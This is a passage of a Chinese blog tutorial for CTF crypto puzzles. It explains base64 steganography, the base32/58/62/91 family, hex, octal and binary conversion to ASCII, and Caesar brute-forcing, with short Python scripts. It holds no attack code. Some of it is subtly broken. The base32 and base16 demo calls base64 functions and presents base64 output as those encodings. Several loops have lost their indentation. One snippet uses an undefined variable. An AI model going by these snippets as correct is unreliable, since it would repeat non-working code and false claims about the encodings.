class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_base64_diff_value</span>(<span class="params">s1, s2</span>):</span></span><br><span class="line">    base64chars = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line">    res = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(len(s2)):</span><br><span class="line">        <span class="keyword">if</span> s1[i] != s2[i]:</span><br><span class="line">            <span class="keyword">return</span> abs(base64chars.index(s1[i]) - base64chars.index(s2[i]))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve_stego</span>():</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">&#x27;/Users/apple/Desktop/1.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        file_lines = f.readlines()</span><br><span class="line">        bin_str = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> file_lines:</span><br><span class="line">            steg_line = line.replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            norm_line = line.replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>).decode(<span class="string">&#x27;base64&#x27;</span>).encode(<span class="string">&#x27;base64&#x27;</span>).replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            diff = get_base64_diff_value(steg_line, norm_line)</span><br><span class="line">            <span class="keyword">print</span> diff</span><br><span class="line">            pads_num = steg_line.count(<span class="string">&#x27;=&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> diff:</span><br><span class="line">                bin_str += bin(diff)[<span class="number">2</span>:].zfill(pads_num * <span class="number">2</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                bin_str += <span class="string">&#x27;0&#x27;</span> * pads_num * <span class="number">2</span></span><br><span class="line">            <span class="keyword">print</span> goflag(bin_str)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">goflag</span>(<span class="params">bin_str</span>):</span></span><br><span class="line">    res_str = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, len(bin_str), <span class="number">8</span>):</span><br><span class="line">        res_str += chr(int(bin_str[i:i + <span class="number">8</span>], <span class="number">2</span>))</span><br><span class="line">    <span class="keyword">return</span> res_str</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    solve_stego()</span><br></pre></td></tr></table></figure><h4 id="多次加密"><a href="#多次加密" class="headerlink" title="多次加密"></a>多次加密</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">repeatedb64decode</span>(<span class="params">ciphertext, times</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(times):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            ciphertext = base64.b64decode(ciphertext)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> ciphertext</span><br><span class="line">    <span class="keyword">return</span> ciphertext</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recursive64decode</span>(<span class="params">ciphertext</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            ciphertext = base64.b64decode(ciphertext)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> ciphertext</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">repeatedb64encode</span>(<span class="params">plaintext , times</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(times):</span><br><span class="line">        plaintext = base64.b64encode(plaintext)</span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br><span class="line">ciphertext = <span class="string">&quot;TVdJd09HRm1NamMyWkdKak56VTVNekkzTVdZMFpXVTJNVFl5T0Rrek1qUWxNRUZsTW1GbE0yRXlNelV3TnpRell6VXhObU5rWVRReE1qUTVPV0poTTJKbE9TVXdRV0prWlRVeVkySXpNV1JsTXpObE5EWXlORFZsTURWbVltUmlaRFptWWpJMEpUQkJaVEl6WlRBd1ltVXpPV1F6Tm1Zek5EWXlaVFUzTm1FMk4yRTNaamt4T1RrbE1FRXhPR00zT1RJNE5XSTFNVFJqTmpObVl6a3dNelZsTTJZNU1qQmhaVFEzTnlVd1FXUmhORFJrWkRFNU1tUmxabVF4WW1VM09XWTJNMk16TlRCa01qa3lNR05tSlRCQk5ESTFNV00wWXpZME9XTTNaREptT0RZek1qZGxabVJsTWpNNU9USm1ZVGNsTUVGaFlXVTNZakprTkRneU16Z3lZV0ZoWkRjMVptUmxOalJrWmpobVpqZzJaaVV3UVRJNU5tWTNabVpqTW1VME5UUTFaR00zTnpreU1EVXdZMlZpTkdFNE56RXhKVEJCTmpFd04yRmpNV0UxTldZeFpUQm1aV05pTjJSa1lqWXdabUl6WW1ZeE1Ea2xNRUZoWldNeU16TXpNekl4WkRjek1EQXdNVFl4TmpneVpETmpOR1ZpWXpBd09TVXdRVFV3TURWaU0ySm1NREF3TlRCaVpqUm1OMlUwTTJGak16TmhNRFExTkdJNEpUQkI=&quot;</span></span><br><span class="line"><span class="keyword">print</span> repeatedb64decode(ciphertext,<span class="number">2</span>)</span><br></pre></td></tr></table></figure><h4 id="base64表反序"><a href="#base64表反序" class="headerlink" title="base64表反序"></a>base64表反序</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">cipher &#x3D; &#39;mZOemIStmomajYyaoL2&#x2F;jJqgycuC&#39;</span><br><span class="line">dic &#x3D; &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+&#x2F;&#39;</span><br><span class="line">dic &#x3D; dic[::-1]</span><br><span class="line">m &#x3D; &#39;&#39;</span><br><span class="line">for i in xrange(0, len(cipher), 4):</span><br><span class="line">    a, b, c, d &#x3D; dic.index(cipher[i]), dic.index(cipher[i+1]), dic.index(cipher[i+2]), dic.index(cipher[i+3])</span><br><span class="line">    m +&#x3D; chr((a&lt;&lt;2&amp;0xff)+(b&gt;&gt;4))</span><br><span class="line">    m +&#x3D; chr((b&lt;&lt;4&amp;0xff)+(c&gt;&gt;2))</span><br><span class="line">    m +&#x3D; chr((c&lt;&lt;6&amp;0xff)+d)</span><br><span class="line">print m</span><br></pre></td></tr></table></figure><h4 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">S = <span class="string">b&#x27;I like Python&#x27;</span></span><br><span class="line">steady = base64.b64encode(S)</span><br><span class="line">print(str(steady,encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure><h4 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">S = <span class="string">&#x27;SSBsaWtlIFB5dGhvbg==&#x27;</span></span><br><span class="line">steady = base64.b64decode(S)</span><br><span class="line">print(str(steady,encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure><h4 id="base家族"><a href="#base家族" class="headerlink" title="base家族"></a>base家族</h4><h5 id="base32"><a href="#base32" class="headerlink" title="base32"></a>base32</h5><p>Base32使用了ASCII编码中可打印的<strong>32</strong>个字符**(大写字母A-Z和数字2~7)**对任意字节数据进行编码.Base32将串起来的二进制数据按照5个二进制位分为一组,由于传输数据的单位是字节(即8个二进制位).所以分割之前的二进制位数是40的倍数(40是5和8的最小公倍数).如果不足40位,则在编码后数据补充<code>=</code>,一个<code>=</code>相当于一个组(5个二进制位),编码后的数据是原先的五分之八倍。末尾最多有6个<code>=</code>。</p><h5 id="base16"><a href="#base16" class="headerlink" title="base16"></a>base16</h5><p>Base16编码就是将ASCII字符集中可打印的字符**(数字0-9和字母A-F)**对应的二进制字节数据进行编码，不会出现<code>=</code>，数据量是原先的两倍。</p><h5 id="base36"><a href="#base36" class="headerlink" title="base36"></a>base36</h5><p>Base36包含0~9的数字，加上所有26个字母，不区分大小写，不包含任何标点，所有的字母要不全大写，要不全小写。所以加起来就是 “0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ”,或者”0123456789abcdefghijklmnopqrstuvwxyz“</p><p><strong>特征特点</strong>：密文由36个字符（0-9,a-z）组成，加密仅支持整数数字，解密仅支持字符串，不支持中文<br>密文由36个字符（0-9,A-Z）</p><h5 id="base58"><a href="#base58" class="headerlink" title="base58"></a>base58</h5><p>base58采用的字符集为“123456789abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ”，从这不难看出，Base58是纯数字与字母组成而且去掉了容易引起视觉混淆的字符（0：数字零，O：大写O，I：大写i，l:小写L）。9个数字+49个字母=58个。由于没有特殊字符所以在采用鼠标双击或移动设备选择时可以自动识别全选。Base58本身就是URLSafe。Base64的URFSafe模式虽然已经对URL支持的比较好，但UUID中还是包含“-或_”。目前流行的比特币，采用的就是Base58Check编码，是在Base58基础上又增加了安全效验机制。</p><p><strong>特征特点</strong>：<br>Base58是用于Bitcoin中使用的一种独特的编码方式，主要用于产生Bitcoin的钱包地址，Base58不使用数字”0”，字母大写”O”，字母大写”I”，和字母小写”l”，以及”+”和”/”符号</p><p>解密</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">C &#x3D; &quot;123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz&quot;</span><br><span class="line">org &#x3D; 0</span><br><span class="line">for d in flag:</span><br><span class="line">    org &#x3D; org*58 + C.index(d)</span><br><span class="line">print (&quot;%x&quot;%org).decode(&quot;hex&quot;)</span><br></pre></td></tr></table></figure><h5 id="base62"><a href="#base62" class="headerlink" title="base62"></a>base62</h5><p>同样的还有 base62编码，就是26个字母的大小写再加上0-9，一共62个字符。</p><p>相比于base64只是去掉了两个在网络上不便传输的符号</p><p><strong>特征特点</strong>：密文由62字符（0-9，a-z，A-Z）组成</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">8nCDq36gzGn8hf4M2HJUsn4aYcYRBSJwj4aE0hbgpzHb4aHcH1zzC9C3IL</span><br></pre></td></tr></table></figure><h5 id="base91"><a href="#base91" class="headerlink" title="base91"></a>base91</h5><p><strong>特征特点</strong>：密文由91个字符（0-9，a-z，A-Z,!#$%&amp;()*+,./:;&lt;=&gt;?@[]^_`{|}~”）组成</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">print(<span class="string">&quot;base64:&quot;</span>)</span><br><span class="line">encode64 = base64.b64encode(<span class="string">b&#x27;I love you&#x27;</span>)</span><br><span class="line">decode64 = base64.b64decode(<span class="string">b&#x27;SSBsb3ZlIHlvdQ==&#x27;</span>)</span><br><span class="line">print(encode64)</span><br><span class="line">print(decode64)</span><br><span class="line">print(<span class="string">&quot;base32:&quot;</span>)</span><br><span class="line">encode32 = base64.b64encode(<span class="string">b&#x27;I love you&#x27;</span>)</span><br><span class="line">decode32 = base64.b64decode(<span class="string">b&#x27;SSBsb3ZlIHlvdQ==&#x27;</span>)</span><br><span class="line">print(encode32)</span><br><span class="line">print(decode32)</span><br><span class="line">print(<span class="string">&quot;base16:&quot;</span>)</span><br><span class="line">encode16 = base64.b64encode(<span class="string">b&#x27;I love you&#x27;</span>)</span><br><span class="line">decode16 = base64.b64decode(<span class="string">b&#x27;SSBsb3ZlIHlvdQ==&#x27;</span>)</span><br><span class="line">print(encode16)</span><br><span class="line">print(decode16)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">base64:</span><br><span class="line"><span class="string">b&#x27;SSBsb3ZlIHlvdQ==&#x27;</span></span><br><span class="line"><span class="string">b&#x27;I love you&#x27;</span></span><br><span class="line">base32:</span><br><span class="line"><span class="string">b&#x27;SSBsb3ZlIHlvdQ==&#x27;</span></span><br><span class="line"><span class="string">b&#x27;I love you&#x27;</span></span><br><span class="line">base16:</span><br><span class="line"><span class="string">b&#x27;SSBsb3ZlIHlvdQ==&#x27;</span></span><br><span class="line"><span class="string">b&#x27;I love you&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="字符串逆序"><a href="#字符串逆序" class="headerlink" title="字符串逆序"></a>字符串逆序</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">steady_str&#x3D;&quot;galf&#123;Lsklth_jxih_guxz_jsgtexp&#125;&quot;</span><br><span class="line">print(steady_str[::-1])</span><br></pre></td></tr></table></figure><h2 id="进制转化"><a href="#进制转化" class="headerlink" title="进制转化"></a>进制转化</h2><p>两个一组转化为十六进制然后在转化为ascii</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">str1=<span class="string">&#x27;d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb9e1e6b3e3b9e4b3b7b7e2b6b1e4b2b6b9e2b1b1b3b3b7e6b3b3b0e3b9b3b5e6fd&#x27;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> len(str1):</span><br><span class="line">print(len(str1))</span><br><span class="line">flag+=chr(int(str1[:<span class="number">2</span>],<span class="number">16</span>)%<span class="number">128</span>)</span><br><span class="line">str1=str1[<span class="number">2</span>:]</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>字符串分割</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">str1=<span class="string">&quot;cvqAeqacLtqazEigwiXobxrCrtuiTzahfFreqc&#123;bnjrKwgk83kgd43j85ePgb_e_rwqr7fvbmHjklo3tews_hmkogooyf0vbnk0ii87Drfgh_n kiwutfb0ghk9ro987k5tfb_hjiouo087ptfcv&#125;&quot;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line">print(str1[<span class="number">0</span>])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>,len(str1),<span class="number">5</span>):</span><br><span class="line">flag+=str1[i]</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>混合进制解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">text = <span class="string">&#x27;d87 x65 x6c x63 o157 d109 o145 b100000 d116 b1101111 o40 x6b b1100101 b1101100 o141 d105 x62 d101 b1101001 d46 o40 d71 x69 d118 x65 x20 b1111001 o157 b1110101 d32 o141 d32 d102 o154 x61 x67 b100000 o141 d115 b100000 b1100001 d32 x67 o151 x66 d116 b101110 b100000 d32 d102 d108 d97 o147 d123 x31 b1100101 b110100 d98 d102 b111000 d49 b1100001 d54 b110011 x39 o64 o144 o145 d53 x61 b1100010 b1100011 o60 d48 o65 b1100001 x63 b110110 d101 o63 b111001 d97 d51 o70 d55 b1100010 d125 x20 b101110 x20 b1001000 d97 d118 o145 x20 d97 o40 d103 d111 d111 x64 d32 o164 b1101001 x6d o145 x7e&#x27;</span></span><br><span class="line">s=text.split()</span><br><span class="line">print(s)</span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    <span class="keyword">if</span> i[<span class="number">0</span>]==<span class="string">&#x27;d&#x27;</span>:</span><br><span class="line">        i=chr(int(i[<span class="number">1</span>:]))</span><br><span class="line">        flag+=i</span><br><span class="line">    <span class="keyword">elif</span> i[<span class="number">0</span>]==<span class="string">&#x27;x&#x27;</span>:</span><br><span class="line">        i=chr(int((<span class="string">&#x27;0&#x27;</span>+i),<span class="number">16</span>))</span><br><span class="line">        flag+=i</span><br><span class="line">    <span class="keyword">elif</span> i[<span class="number">0</span>]==<span class="string">&#x27;b&#x27;</span>:</span><br><span class="line">        i=chr(int((<span class="string">&#x27;0&#x27;</span>+i),<span class="number">2</span>))</span><br><span class="line">        flag+=i</span><br><span class="line">    <span class="keyword">elif</span> i[<span class="number">0</span>]==<span class="string">&#x27;o&#x27;</span>:</span><br><span class="line">        i=chr(int((<span class="string">&#x27;0&#x27;</span>+i),<span class="number">8</span>))</span><br><span class="line">        flag+=i</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>十六进制准换ascii</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">steady_str=<span class="string">&quot;57656C6C20646F6E653A4A35584759364A414E3558474B4944544F525358414944424F355158534F5352474934584B5752544A4A5547495343574F4E4D56515554514D495A444B3653504E55345755594C4F494933574B334C554F425257323442544D4A4C5451354443474A344847594C4A4746325745563359474E47464F3444574D56445757354445493459584D5953484756345745334A5A47425347324D4C324D5A49543250493D&quot;</span></span><br><span class="line">steady_flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(steady_str),<span class="number">2</span>):</span><br><span class="line">    h=<span class="string">&quot;0x&quot;</span>+steady_str[i:i+<span class="number">2</span>]</span><br><span class="line">    n=int(h,<span class="number">16</span>)</span><br><span class="line">    steady_flag+=chr(n)</span><br><span class="line">print(steady_flag)</span><br></pre></td></tr></table></figure><h3 id="八进制"><a href="#八进制" class="headerlink" title="八进制"></a>八进制</h3><p>八进制有 0~7 共8个数字，在CTF编码中，常见的数字中如果没有超过8的数字且长度为3的倍数，则大多为八进制。通常我们将数字三个一组转化为十进制然后ascii，进而得到flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">steady_str=<span class="string">&quot;146154141147173110141166145137171060125137120171137163143162151160164137117164143137124157137124145156137101163143151151041175&quot;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(steady_str),<span class="number">3</span>):</span><br><span class="line">  flag+=chr(int(steady_str[i:i+<span class="number">3</span>],<span class="number">8</span>))</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>使用python-oct转化成八进制的时候默认会带有<code>0o</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">steady_str=<span class="string">&quot;flag&quot;</span></span><br><span class="line">steady_num=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> steady_str:</span><br><span class="line">  steady_num+=oct(ord(i))</span><br><span class="line">print(steady_num)</span><br><span class="line"><span class="number">146154141147</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">steady_str=<span class="string">&quot;ctf&quot;</span></span><br><span class="line">steady_num=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> steady_str:</span><br><span class="line">  steady_num+=oct(ord(i))[<span class="number">2</span>:]</span><br><span class="line">print(steady_num)</span><br><span class="line"><span class="number">143164146</span></span><br></pre></td></tr></table></figure><p>同理</p><p><code>CTF</code>—<code>103124106</code></p><p><code>FLAG</code>–<code>106114101107</code></p><p>在CTF中一定要注意这几个数字。</p><h3 id="十六进制"><a href="#十六进制" class="headerlink" title="十六进制"></a>十六进制</h3><p>由0-9，A-F，组成。与10进制的对应关系是：0-9对应0-9；A-F对应10-15；</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">steady_str=<span class="string">&quot;flag&quot;</span></span><br><span class="line">steady_num=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> steady_str:</span><br><span class="line">  steady_num+=hex(ord(i))[<span class="number">2</span>:]</span><br><span class="line">print(steady_num)</span><br><span class="line"><span class="number">666</span>c6167</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">steady_str=<span class="string">&quot;ctf&quot;</span></span><br><span class="line">steady_num=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> steady_str:</span><br><span class="line">  steady_num+=hex(ord(i))[<span class="number">2</span>:]</span><br><span class="line">print(steady_num)</span><br><span class="line"><span class="number">637466</span></span><br></pre></td></tr></table></figure><p>同理</p><p><code>CTF</code>–<code>435446</code></p><p><code>FLAG</code>–<code>464c4147</code></p><p>常见的十六进制为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">666</span>C61677B68696464656E5F696E5F7468655F6D6964646C657D</span><br></pre></td></tr></table></figure><h4 id="关于二进制转十六进制"><a href="#关于二进制转十六进制" class="headerlink" title="关于二进制转十六进制"></a>关于二进制转十六进制</h4><p>四个二进制转化为一个六进制</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">steady_str=<span class="string">&quot;010100100110000101110010001000010001101000000111000000001100111110010000&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(steady_str),<span class="number">4</span>):</span><br><span class="line">  flag+=hex(int(steady_str[i:i+<span class="number">4</span>],<span class="number">2</span>))[<span class="number">2</span>:]</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h3 id="ascii"><a href="#ascii" class="headerlink" title="ascii"></a>ascii</h3><p>45对应ASCII”-“，42对应”*”，变成了<code>-- *-- --* --* * *-* *--</code>。莫斯密码。</p><h2 id="凯撒密码"><a href="#凯撒密码" class="headerlink" title="凯撒密码"></a>凯撒密码</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>凯撒密码作为一种最为古老的对称加密体制，在古罗马的时候都已经很流行，他的基本思想是：通过把字母移动一定的位数来实现加密和解密。明文中的所有字母都在字母表上向后（或向前）按照一个固定数目进行偏移后被替换成密文。例如，当偏移量是3的时候，所有的字母A将被替换成D，B变成E，以此类推X将变成A，Y变成B，Z变成C。由此可见，位数就是凯撒密码加密和解密的密钥。现今又叫“移位密码”，只不过移动的位数不一定是3位而已。</p><p>下面我们总结一下：</p><p>明密对照表：</p><p>明文：ABCDEFGHIJKLMNOPQRSTUVWXYZ</p><p>密文：TUVWXYZABCDEFGHIJKLMNOPQRS</p><p>注：广义上的凯撒是位移的。</p><p>凯撒是没有密匙的，即使没有密匙也能将它破解出来，因为凯撒移位密码只有25种密匙。</p><p>暴力破解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">str1 = <span class="string">&quot;oknqdbqmoq&#123;kag_tmhq_xqmdzqp_omqemd_qzodkbfuaz&#125;&quot;</span></span><br><span class="line">num = <span class="number">26</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">steady</span>(<span class="params">str=<span class="string">&quot;123&quot;</span>,num=<span class="number">1</span></span>):</span></span><br><span class="line">    l = list(str)</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; len(l):</span><br><span class="line">        <span class="keyword">if</span> l[i]&gt;=<span class="string">&#x27;0&#x27;</span> <span class="keyword">and</span> l[i]&lt;=<span class="string">&#x27;9&#x27;</span>:</span><br><span class="line">            i = i+<span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> l[i]&gt;=<span class="string">&#x27;a&#x27;</span> <span class="keyword">and</span> l[i] &lt;=<span class="string">&#x27;z&#x27;</span>:</span><br><span class="line">            l[i]=chr(ord(<span class="string">&#x27;a&#x27;</span>)+(ord(l[i])+num-ord(<span class="string">&#x27;a&#x27;</span>))%<span class="number">26</span>)</span><br><span class="line">            i =i+<span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> l[i]&gt;=<span class="string">&#x27;A&#x27;</span> <span class="keyword">and</span> l[i] &lt;=<span class="string">&#x27;Z&#x27;</span>:</span><br><span class="line">            l[i]=chr(ord(<span class="string">&#x27;A&#x27;</span>)+(ord(l[i])+num-ord(<span class="string">&#x27;A&#x27;</span>))%<span class="number">26</span>)</span><br><span class="line">            i=i+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            i =i+<span class="number">1</span></span><br><span class="line">    ans = <span class="string">&quot;&quot;</span>.join(l)</span><br><span class="line">    <span class="keyword">return</span> ans</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span 